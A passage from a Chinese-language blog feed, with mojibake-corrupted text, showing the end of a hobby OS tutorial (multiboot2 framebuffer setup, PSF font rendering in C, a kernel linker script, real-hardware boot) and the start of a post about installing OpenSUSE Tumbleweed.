class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>            framebuffer_base[y * framebuffer_width + x] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">boot_get_frame_buffer</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_framebuffer</span> *<span class="hljs-title">fb_info</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag</span> *<span class="hljs-title">tag</span> =</span> (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* find framebuffer tag */</span><br>    <span class="hljs-keyword">if</span> (tag == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (tag-&gt;type != MULTIBOOT_TAG_TYPE_END) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_FRAMEBUFFER) &#123;<br>            fb_info = (<span class="hljs-keyword">struct</span> multiboot_tag_framebuffer*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) \<br>              ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fb_info == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    framebuffer_base = (<span class="hljs-type">uint32_t</span>*) fb_info-&gt;common.framebuffer_addr;<br>    framebuffer_height = fb_info-&gt;common.framebuffer_height;<br>    framebuffer_width = fb_info-&gt;common.framebuffer_width;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="â‘¡-å­—ä½“è§£æç»˜åˆ¶"><a href="#â‘¡-å­—ä½“è§£æç»˜åˆ¶" class="headerlink" title="â‘¡ å­—ä½“è§£æç»˜åˆ¶"></a>â‘¡ å­—ä½“è§£æç»˜åˆ¶</h3><p>è™½ç„¶æˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡ç›´æ¥æ“ä½œ Frame buffer æ¥ç»˜åˆ¶å›¾å½¢ï¼Œä½†æ˜¯æ¯ä¸ªå­—ä½“éƒ½è¦ä»é›¶å¼€å§‹ç»˜åˆ¶çš„è¯æœªå…å°±å¤ªéº»çƒ¦äº†ä¸€ç‚¹ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©è½½å…¥ç°æœ‰çš„ <strong>PC Screen Font</strong> æ ¼å¼çš„å­—ä½“æ–‡ä»¶ï¼Œä»ä¸­è¯»å–ç›¸åº”çš„å­—ä½“ä¿¡æ¯è¿›è¡Œç»˜åˆ¶</p><blockquote><p>è¿™é‡Œå­—ä½“ç¬”è€…é€‰æ‹©äº† <a href="https://github.com/talamus/solarize-12x29-psf/">solarize-12x29</a>ï¼Œclone åˆ°æœ¬åœ°åå°† <code>Solarize.12x29.psf</code> æ‹·è´ä¸º <code>arch/x86/boot/font.psf</code> å³å¯</p></blockquote><p>ç”±äºæˆ‘ä»¬è¿˜æ²¡å»ºç«‹æ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†å­—ä½“æ–‡ä»¶ç›´æ¥é“¾æ¥åˆ°å†…æ ¸å½“ä¸­ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ <code>objcopy</code> è¿™ä¸€å·¥å…·æ¥å°†å­—ä½“æ–‡ä»¶è½¬æ¢ä¸ºå¯é“¾æ¥æ–‡ä»¶ï¼š</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>objcopy ä¼šéå¸¸ sb åœ°æŠŠè·¯å¾„åä¹Ÿæ”¾è¿›å»</strong>ï¼Œç¬”è€…æš‚æ—¶æ²¡æœ‰æ‰¾åˆ°å¥½çš„è§£å†³æ–¹æ¡ˆ :ï¼ˆ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objcopy -O elf64-x86-64 -B i386 -I binary boot/font.psf boot_font.o</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -t boot_font.o</span> <br><br>boot_font.o:     file format elf64-x86-64<br><br>SYMBOL TABLE:<br>0000000000000000 g       .data0000000000000000 _binary_boot_font_psf_start<br>0000000000007420 g       .data0000000000000000 _binary_boot_font_psf_end<br>0000000000007420 g       *ABS*0000000000000000 _binary_boot_font_psf_size<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹å¦‚ä½•è§£æè¿™ä¸€æ ¼å¼çš„å­—ä½“ï¼ŒPSF æœ‰ä¸¤ç‰ˆè§„èŒƒï¼Œç”±ä¸€ä¸ª header æ¥æŒ‡ç¤ºå­—ä½“åŸºæœ¬ä¿¡æ¯ï¼Œ header ä¹‹åä¾¿æ˜¯å­—ä½“çš„ä½å›¾ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF1_FONT_MAGIC 0x0436</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf1_header</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> magic;     <span class="hljs-comment">/* magic number for identification */</span><br>    <span class="hljs-type">uint8_t</span> font_mode;  <span class="hljs-comment">/* PSF font mode */</span><br>    <span class="hljs-type">uint8_t</span> char_size;  <span class="hljs-comment">/* PSF char size */</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF2_FONT_MAGIC 0x864ab572</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> magic;             <span class="hljs-comment">/* magic number for PSF */</span><br>    <span class="hljs-type">uint32_t</span> version;           <span class="hljs-comment">/* zero */</span><br>    <span class="hljs-type">uint32_t</span> header_size;       <span class="hljs-comment">/* offset of bitmaps in file, 32 */</span><br>    <span class="hljs-type">uint32_t</span> flags;             <span class="hljs-comment">/* 0 if there&#x27;s no unicode table */</span><br>    <span class="hljs-type">uint32_t</span> glyph_nr;          <span class="hljs-comment">/* number of glyphs */</span><br>    <span class="hljs-type">uint32_t</span> bytes_per_glyph;   <span class="hljs-comment">/* size of each glyph */</span><br>    <span class="hljs-type">uint32_t</span> height;            <span class="hljs-comment">/* height in pixels */</span><br>    <span class="hljs-type">uint32_t</span> width;             <span class="hljs-comment">/* width in pixels */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å­—ä½“ä½å›¾æœ‰ç€å…¶å›ºå®šçš„å®½åº¦ä¸é«˜åº¦ï¼Œè™½ç„¶å­—ä½“çš„å®½åº¦å¹¶ä¸ä¸€å®šå¯¹é½åˆ° 8 bitï¼Œä½†æ˜¯å­˜å‚¨ç©ºé—´éœ€è¦å¯¹é½åˆ° 8 bit ä¹Ÿå°±æ˜¯ 1 å­—èŠ‚ï¼Œå› æ­¤<strong>ä½å›¾æ•°æ®ä¸­ä¼šæœ‰ç©ºæ•°æ®å¡«å……æ®µ</strong>ï¼Œä»¥ä¸€ä¸ª 12x12 çš„ PSF ä½å›¾ä¸ºç¤ºä¾‹ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">           padding<br> Font data    |<br>+----------+ +--+<br><span class="hljs-number">000001100000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000011110000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000110011000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">001100001100</span> <span class="hljs-number">0000</span><br><span class="hljs-number">011000000110</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç æ¥è§£æå­—ä½“æ–‡ä»¶å¹¶åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæ–‡å­—ï¼ˆäºŒä»£è§„èŒƒï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_boot_font_psf_start[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_boot_font_psf_end[];<br><br><span class="hljs-comment">/* char output info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> cursor_x, cursor_y;    <span class="hljs-comment">/* count by chars */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> max_ch_nr_x, max_ch_nr_y;<br><br><span class="hljs-comment">/* font info */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> *<span class="hljs-title">boot_font</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width, font_height;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width_bytes;<br><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *glyph_table;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> bytes_per_glyph, glyph_nr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">boot_putchar_raw</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch, <span class="hljs-type">uint32_t</span> fg, <span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> *glyph = glyph_table;<br>    <span class="hljs-type">size_t</span> loc;<br><br>    <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;\n&#x27;</span>) &#123;<br>        <span class="hljs-keyword">goto</span> new_line;<br>    &#125;<br><br>    <span class="hljs-comment">/* if char out of range, output null */</span><br>    <span class="hljs-keyword">if</span> (ch &lt; glyph_nr) &#123;<br>        glyph += ch * bytes_per_glyph;<br>    &#125;<br><br>    loc =  cursor_y * font_height * framebuffer_width;<br>    loc += cursor_x * font_width;<br><br>    <span class="hljs-comment">/* output the font to frame buffer */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_y = <span class="hljs-number">0</span>; ch_y &lt; font_height; ch_y++) &#123;<br>        <span class="hljs-type">uint8_t</span> mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_x = <span class="hljs-number">0</span>; ch_x &lt; font_width; ch_x++) &#123;<br>            <span class="hljs-keyword">if</span> ((*(glyph + ch_x / <span class="hljs-number">8</span>) &amp; mask) != <span class="hljs-number">0</span>) &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = fg;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = bg;<br>            &#125;<br><br>            mask &gt;&gt;= <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (ch_x % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br>            &#125;<br>        &#125;<br><br>        glyph += font_width_bytes;<br>    &#125;<br><br>    <span class="hljs-comment">/* move cursor */</span><br>    cursor_x++;<br><br>    <span class="hljs-comment">/* we may need to move to new line */</span><br>    <span class="hljs-keyword">if</span> (cursor_x &gt;= max_ch_nr_x) &#123;<br>    new_line:<br>        cursor_x = <span class="hljs-number">0</span>;<br>        cursor_y++;<br>        <br>        <span class="hljs-comment">/* we may need to scroll up */</span><br>        <span class="hljs-keyword">if</span> (cursor_y &gt;= max_ch_nr_y) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; ((max_ch_nr_y - <span class="hljs-number">1</span>) * font_height); y++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                    framebuffer_base[x + y * framebuffer_width] = <br>                    framebuffer_base[x + (y + font_height) * framebuffer_width];<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; font_height; y++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                    <span class="hljs-type">size_t</span> lines = (y + (max_ch_nr_y - <span class="hljs-number">1</span>) * font_height);<br>                    <span class="hljs-type">size_t</span> loc = lines * framebuffer_width + x;<br>                    framebuffer_base[loc] = bg;<br>                &#125;<br>            &#125;<br><br>            cursor_y--;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">boot_init_font</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    boot_font = (<span class="hljs-keyword">struct</span> psf2_header*) _binary_boot_font_psf_start;<br><br>    font_width_bytes = (boot_font-&gt;width + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br>    font_width = font_width_bytes * <span class="hljs-number">8</span>;<br>    font_height = boot_font-&gt;height;<br><br>    glyph_table = (<span class="hljs-type">uint8_t</span>*)_binary_boot_font_psf_start+boot_font-&gt;header_size;<br>    glyph_nr = boot_font-&gt;glyph_nr;<br>    bytes_per_glyph = boot_font-&gt;bytes_per_glyph;<br><br>    cursor_x = cursor_y = <span class="hljs-number">0</span>;<br>    max_ch_nr_x = framebuffer_width / font_width;<br>    max_ch_nr_y = framebuffer_height / font_height;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Extraï¼š-ä¸²å£è¾“å‡º"><a href="#Extraï¼š-ä¸²å£è¾“å‡º" class="headerlink" title="Extraï¼š ä¸²å£è¾“å‡º"></a><em>Extraï¼š ä¸²å£è¾“å‡º</em></h3><blockquote><p>TO BE ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote><h2 id="é“¾æ¥è„šæœ¬"><a href="#é“¾æ¥è„šæœ¬" class="headerlink" title="é“¾æ¥è„šæœ¬"></a>é“¾æ¥è„šæœ¬</h2><blockquote><p>ä»€ä¹ˆï¼Œä½ ä¸çŸ¥é“ä»€ä¹ˆäº‹é“¾æ¥è„šæœ¬ï¼Ÿè¿˜ä¸<a href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_chapter/ld_3.html">èµ¶å¿«å­¦</a>ï¼</p></blockquote><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œ<strong>GNU GRUB ä¼šé»˜è®¤å°†å†…æ ¸è½½å…¥åˆ°ç‰©ç†åœ°å€é«˜ 1MB èµ·å§‹</strong>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨é“¾æ¥è„šæœ¬ä¸­è¿›è¡ŒæŒ‡å®šï¼ŒåŒæ—¶ä½œä¸ºä¸€ä¸ªä¸æˆæ–‡çš„è§„èŒƒï¼Œ<strong>å†…æ ¸åº”å½“è¢«è£…è½½åˆ°é«˜åœ°å€å¤„</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„å†…æ ¸åº”å½“åˆ†ä¸ºå¦‚ä¸‹ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>bootï¼šç”± GRUB å¼•å¯¼ï¼Œè´Ÿè´£è¿›è¡Œé¡µè¡¨é‡æ˜ å°„ã€å†…å­˜ç®¡ç†åˆå§‹åŒ–ç­‰é¢„å¤‡å·¥ä½œï¼Œå®Œæˆåè·³è½¬è‡³å†…æ ¸</li><li>kernelï¼šå®é™…çš„å†…æ ¸ä¸»ä½“ï¼Œä½äºè™šæ‹Ÿåœ°å€çš„é«˜åœ°å€å¤„</li></ul><p>ç¬”è€…é€‰æ‹©å°† boot é˜¶æ®µçš„æ‰€æœ‰ä»£ç å…¨éƒ½æ”¾åœ¨ä¸€ä¸ªå¤§çš„åä¸º <code>boot</code> çš„æ®µå½“ä¸­ï¼Œå°† kernel çš„ <code>.text</code> ç­‰æ®µé‡æ–°ä»é«˜åœ°å€å¤„è®¡ç®—èµ·å§‹åœ°å€ï¼Œå› æ­¤é“¾æ¥è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs ld">OUTPUT_FORMAT(&quot;elf64-x86-64&quot;)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    /* boot loader will load the kernel there */<br>    . = 1M;<br>__boot_start = .;<br><br>    .boot :<br>&#123;<br>KEEP(*(.boot.header))<br>*(.boot.*)<br>. = ALIGN(4096);<br><br>/* C part boot kernel */<br>*arch/boot*.o<br>&#125;<br><br>__boot_end = .;<br><br>/* now it comes to the real kernel */<br>KERM_VADDR = 0xffffffff81000000;<br>. = KERM_VADDR;<br><br>/* we use AT() there to make it loaded on phys correctly */<br>.text ALIGN(4096) : AT (ADDR (.text) - KERM_VADDR)<br>&#123;<br>*(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.rodata ALIGN(4096) : AT (ADDR (.rodata) - KERM_VADDR)<br>&#123;<br>*(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__roseg_end = .;<br><br>.data ALIGN(4096) : AT (ADDR (.data) - KERM_VADDR)<br>&#123;<br>*(.data)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.bss ALIGN(4096) : AT (ADDR (.bss) - KERM_VADDR)<br>&#123;<br>*(COMMON)<br>*(.bss)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="çœŸæœºå¯åŠ¨"><a href="#çœŸæœºå¯åŠ¨" class="headerlink" title="çœŸæœºå¯åŠ¨"></a>çœŸæœºå¯åŠ¨</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>make</code> å‘½ä»¤ç¼–è¯‘ä»£ç ï¼Œå°† <code>out</code> ç›®å½•ä¸‹çš„ <code>kernel.bin</code> æ–‡ä»¶æ”¾åˆ° U ç›˜ EFI åˆ†åŒºä¸­çš„ <code>boot</code> ç›®å½•ä¸‹ï¼Œé‡å¯è®¡ç®—æœºå¹¶é€‰æ‹© U ç›˜å¯åŠ¨ï¼Œæ¥ä¸‹æ¥â€”â€”</p><p><strong>ClosureOSï¼Œå¯åŠ¨â€”â€”ï¼ï¼ï¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041505.png"></p><p>æˆ‘ä»¬æˆåŠŸåˆ¶ä½œå®Œæˆäº†ä¸€ä¸ª<strong>èƒ½å¤Ÿåœ¨çœŸæœºä¸Šè¿è¡Œçš„æ“ä½œç³»ç»Ÿï¼Œè€Œå¹¶éå¤§éƒ¨åˆ†æ•™ç§‘ä¹¦ä¸Šçš„é‚£äº›åªèƒ½åœ¨è™šæ‹Ÿæœºé‡Œè·‘çš„å°ç©å…·</strong>ï¼Œè™½ç„¶ç›®å‰ä»…æœ‰æœ€åŸºæœ¬çš„é›å½¢ ï¼šï¼‰</p><blockquote><p>æˆ‘ä»¬å°†åœ¨åç»­åšå®¢å½“ä¸­é€æ­¥å®Œå–„è¿™ä¸ªæ“ä½œç³»ç»Ÿï¼ˆğŸ•ŠğŸ•ŠğŸ•Šï¼‰</p></blockquote><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://elixir.bootlin.com/linux/latest/source">Linux source code - Bootlin</a></p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">Multiboot2 Specification version 2.0</a></p><p><a href="https://wiki.osdev.org/Main_Page">OSDev wiki</a> â† éå¸¸å¥½ç»´åŸºï¼Œä½¿æˆ‘OSè¿è¡Œï¼Œçˆ±æ¥è‡ªç“·å™¨â¤</p><p><a href="https://zhuanlan.zhihu.com/UEFIBlog">UEFI å’Œ BIOS æ¢ç§˜</a></p><p><a href="https://wiki.osdev.org/PC_Screen_Font">PC Screen Font</a></p><p><a href="https://os.phil-opp.com/">Writing an OS in Rust</a></p><p><a href="https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/">https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/</a></p><p><a href="https://oscarcx.com/tech/usb-boot-winpe-and-linux-via-grub2.html">ç”¨grub2åˆ¶ä½œå¤šé‡å¼•å¯¼çš„WinPE&amp;Linuxå¯åŠ¨Uç›˜</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¥é¥é¢†å…ˆï¼é¥é¥é¢†å…ˆï¼é¥é¥é¢†å…ˆï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="å¼€å‘æ‰‹è®°" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="Assembly Language" scheme="https://arttnba3.github.io/tags/Assembly-Language/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>ã€DISTRO.0x01ã€‘å¦‚ä½•æ­£ç¡®æ‰“å¼€ OpenSUSE Tumbleweed</title>
    <link href="https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/</id>
    <published>2023-11-23T14:22:31.000Z</published>
    <updated>2023-11-25T11:41:44.915Z</updated>
    
    <content type="html"><![CDATA[<p>ä½ è¯´ğŸ‰å¯¹ï¼Œä½†æ˜¯ Arch Linux æ˜¯ç”± Arch ç¤¾åŒºå¼€å‘çš„ä¸€ä¸ª Linux å‘è¡Œç‰ˆâ€¦</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…æ­¤å‰ä¸€ç›´åœ¨ç”¨ Arch Linuxï¼Œä½†æ˜¯æœ€è¿‘åœ¨å¸®ä¸­å›½å¤§é™†çš„ä¸€äº› CTF èµ›äº‹å‡ºé¢˜æ—¶é‡åˆ°äº†ä¸€äº›æ¯”è¾ƒå¥‡æ€ªçš„é—®é¢˜ï¼šåœ¨ä½¿ç”¨ Docker å¯åŠ¨çš„ Ubuntu ç¯å¢ƒä¸­ï¼Œç”¨æ¥å¯åŠ¨é¢˜ç›®æœåŠ¡çš„ <code>xinetd</code> <strong>æ— æ³•æ­£å¸¸å·¥ä½œ</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010554.png"></p><p>ä¸è¿‡ä¹Ÿä¸æ˜¯å®Œå…¨è¿ä¸ä¸Šï¼Œä½†æ˜¯è¦ç­‰å¾ˆä¹…ï¼Œç¬”è€…æ€€ç–‘å¯èƒ½æ˜¯å†…æ ¸å®‰å…¨ç­–ç•¥çš„ç¼˜æ•…ï¼ˆå› ä¸ºåœ¨å®¹å™¨å†…éƒ¨ç”¨ <code>nc</code> ä¹Ÿè¿ä¸ä¸Šï¼‰ï¼Œäºæ˜¯ç¬”è€…æµ‹è¯•äº†å¸‚é¢ä¸Šæ¯”è¾ƒä¸»æµçš„å£ç¢‘æ¯”è¾ƒå¥½çš„å‡ ä¸ª Linux å‘è¡Œç‰ˆï¼Œé™¤äº†åŸç”Ÿ Ubuntu ä»¥å¤–<strong>ä¹Ÿå°±åªæœ‰ OpenSUSE èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ</strong>ï¼š</p><p><img 